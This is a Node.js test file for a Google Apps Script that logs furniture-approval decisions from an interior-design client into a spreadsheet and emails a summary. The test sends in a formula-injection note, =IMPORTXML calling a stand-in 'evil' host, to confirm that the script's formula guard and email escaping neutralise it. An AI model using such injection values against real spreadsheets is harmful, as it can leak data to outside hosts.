// Checks procurement/_source/212n9th-decisions.gs against a fake Sheet, a fake
// mailer and a controllable clock, through three sends and some bad input.
// Run from the repo root before redeploying the script:
//   node procurement/_source/212n9th-decisions.test.js
const fs = require("fs"), vm = require("vm"), assert = require("assert");
const code = fs.readFileSync(process.argv[2] || require("path").join(__dirname, "212n9th-decisions.gs"), "utf8");

// ── A fake Sheet that behaves like Apps Script where the script relies on it ──
let clock = new Date("2026-09-30T15:00:00");
const pad = n => String(n).padStart(2, "0");
const mail = [];
function makeSheet(name) {
  const data = [];
  const sheet = {
    name, data,
    getLastRow: () => data.length,
    getSheetId: () => 42,
    setFrozenRows() {}, setColumnWidth() {},
    getDataRange: () => ({ getValues: () => data.map(r => r.slice()) }),
    getRange(row, col, nr = 1, nc = 1) {
      return {
        setValues(vals) {
          vals.forEach((r, i) => r.forEach((v, j) => {
            const R = row - 1 + i, C = col - 1 + j;
            while (data.length <= R) data.push(Array(12).fill(""));
            // A leading apostrophe makes the cell plain text and isn't stored.
            data[R][C] = typeof v === "string" && v.startsWith("'") ? v.slice(1) : v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setNumberFormat() { return this; },
        setDataValidation() { return this; }, setBackground() { return this; },
      };
    },
  };
  return sheet;
}
const tabs = {};
const ss = {
  getSpreadsheetTimeZone: () => "America/New_York",
  getSheetByName: n => tabs[n] || null,
  insertSheet: n => (tabs[n] = makeSheet(n)),
  getNumSheets: () => Object.keys(tabs).length,
  getUrl: () => "https://docs.google.com/spreadsheets/d/TEST/edit",
};
const chain = new Proxy({}, { get: (t, k) => (k === "build" ? () => ({}) : () => chain) });
const sandbox = {
  SpreadsheetApp: { getActiveSpreadsheet: () => ss, openById: id => { assert.equal(id, "1KhWinSYJopcwviQjfrZb1ks1ZHi3ZJqQDtG0OYWu5IM"); return ss; }, newDataValidation: () => chain },
  Utilities: { formatDate: (d, tz, f) => f === "yyyyMMdd-HHmmss"
    ? `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}-${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`
    : `Sep ${d.getDate()}, 2026 ${d.getHours() - 12}:${pad(d.getMinutes())} PM` },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  MailApp: { sendEmail: m => mail.push(m) },
  Session: { getEffectiveUser: () => ({ getEmail: () => "owner@example.com" }) },
  ContentService: { MimeType: { JSON: "json" }, createTextOutput: s => ({ setMimeType: () => JSON.parse(s) }) },
  Date: class extends Date { constructor(...a) { super(...(a.length ? a : [clock])); } },
};
vm.createContext(sandbox);
vm.runInContext(code, sandbox);
const post = body => { clock = new Date(clock.getTime() + 60000); return sandbox.doPost({ postData: { contents: JSON.stringify(body) } }); };
const rowsOf = id => tabs["Client Actions"].data.filter(r => r[1] === id);
const byPiece = (id, piece) => rowsOf(id).find(r => r[4] === piece);

// ── Send 1: an approval, a preferred alternate with a note, a general note ──
const r1 = post({ from: "Jess", general: "Love the direction", recommended: 52502, withPicks: 52902, pageUrl: "https://knocktwice.studio/x",
  decisions: [
    { room: "Living Room", piece: "Couch", decision: "Approved", choice: "Muse Corner Sectional", price: 12000, note: "" },
    { room: "Living Room", piece: "Accent Chair", decision: "Prefers alternate", choice: "Huggy Swivel Chair", price: 7390, note: "Comfier?" },
  ] });
assert.equal(r1.ok, true, JSON.stringify(r1));
assert.equal(r1.rows, 3);
assert.deepEqual(tabs["Client Actions"].data[0].slice(0, 3), ["Sent", "Submission", "From"]);
assert.equal(byPiece(r1.submission, "Couch")[9], "New");
assert.equal(byPiece(r1.submission, "General note")[5], "Note");
assert.equal(mail.length, 1);
assert.equal(mail[0].to, "owner@example.com");
assert.match(mail[0].subject, /decisions from Jess/);
assert.match(mail[0].htmlBody, /What changed \(3\)/);
console.log("send 1: 3 rows, all New, email sent to the deploying account");

// ── The team answers on the Couch row ──
const couch = byPiece(r1.submission, "Couch");
couch[10] = "Accepted"; couch[11] = "Ordering Monday";

// ── Send 2: Couch unchanged, chair note changed, a new note that looks like
//    a formula, and the general note taken back ──
const r2 = post({ from: "Sam", general: "", recommended: 52502, withPicks: 52902,
  decisions: [
    { room: "Living Room", piece: "Couch", decision: "Approved", choice: "Muse Corner Sectional", price: 12000, note: "" },
    { room: "Living Room", piece: "Accent Chair", decision: "Prefers alternate", choice: "Huggy Swivel Chair", price: 7390, note: "Comfier? In green?" },
    { room: "Dining Room", piece: "Rug", decision: "Note", choice: "", price: "", note: "=IMPORTXML(\"http://evil\",\"//a\")" },
    { room: "Living Room", piece: "Couch", decision: "Approved", choice: "dupe", price: 1, note: "" },
  ] });
assert.equal(r2.ok, true);
assert(r2.submission > r1.submission, "submission ids sort in time order");
const c2 = byPiece(r2.submission, "Couch");
assert.equal(c2[9], "Same");
assert.equal(c2[10], "Accepted", "team status carried forward on an unchanged piece");
assert.equal(c2[11], "Ordering Monday", "team reply carried forward");
assert.equal(rowsOf(r2.submission).filter(r => r[4] === "Couch").length, 1, "duplicate piece ignored");
assert.equal(byPiece(r2.submission, "Accent Chair")[9], "Changed");
assert.equal(byPiece(r2.submission, "Accent Chair")[10], "", "a changed piece starts fresh for the team");
assert.equal(byPiece(r2.submission, "Rug")[9], "New");
const general2 = byPiece(r2.submission, "General note");
assert.equal(general2[5], "Withdrawn");
assert.match(mail[1].htmlBody, /What changed \(3\)/);
assert.match(mail[1].htmlBody, /1 unchanged/);
assert.doesNotMatch(mail[1].htmlBody, /<script|IMPORTXML\("http/, "email escapes client text");
console.log("send 2: Same carries the team's answer, Changed and New start fresh, general note Withdrawn, duplicate ignored");

// ── Send 3: identical to send 2 ──
const r3 = post({ from: "Sam", general: "", recommended: 52502, withPicks: 52902,
  decisions: [
    { room: "Living Room", piece: "Couch", decision: "Approved", choice: "Muse Corner Sectional", price: 12000, note: "" },
    { room: "Living Room", piece: "Accent Chair", decision: "Prefers alternate", choice: "Huggy Swivel Chair", price: 7390, note: "Comfier? In green?" },
    { room: "Dining Room", piece: "Rug", decision: "Note", choice: "", price: "", note: "=IMPORTXML(\"http://evil\",\"//a\")" },
  ] });
assert.equal(rowsOf(r3.submission).length, 3, "a withdrawn piece isn't withdrawn twice");
assert(rowsOf(r3.submission).every(r => r[9] === "Same"));
assert.equal(byPiece(r3.submission, "Couch")[11], "Ordering Monday", "answer survives several resends");
assert.match(mail[2].htmlBody, /Nothing changed/);
console.log("send 3: identical resend is all Same, answer still attached, no repeat Withdrawn");

// ── Bad input fails safely ──
const bad = sandbox.doPost({ postData: { contents: "not json" } });
assert.equal(bad.ok, false);
console.log("bad input: returns ok:false instead of throwing");

// ── The formula guard: what would reach setValues ──
assert.equal(sandbox.safe_("=SUM(A1)"), "'=SUM(A1)");
assert.equal(sandbox.safe_("-great"), "'-great");
assert.equal(sandbox.safe_("fine"), "fine");
assert.equal(sandbox.safe_(12000), 12000);
console.log("formula guard: text starting with = + - @ is stored as plain text");
// The script is pasted into Apps Script by hand, and the Mac clipboard can
// mangle anything outside plain ASCII (a "·" arrived in email as "¬∑").
const odd = [...code].filter(c => c.charCodeAt(0) > 127);
assert.equal(odd.length, 0, "script must be plain ASCII to survive copy and paste; found: " + [...new Set(odd)].join(" "));
console.log("paste-safe: the script is plain ASCII");
console.log("\nALL SCRIPT CHECKS PASSED");
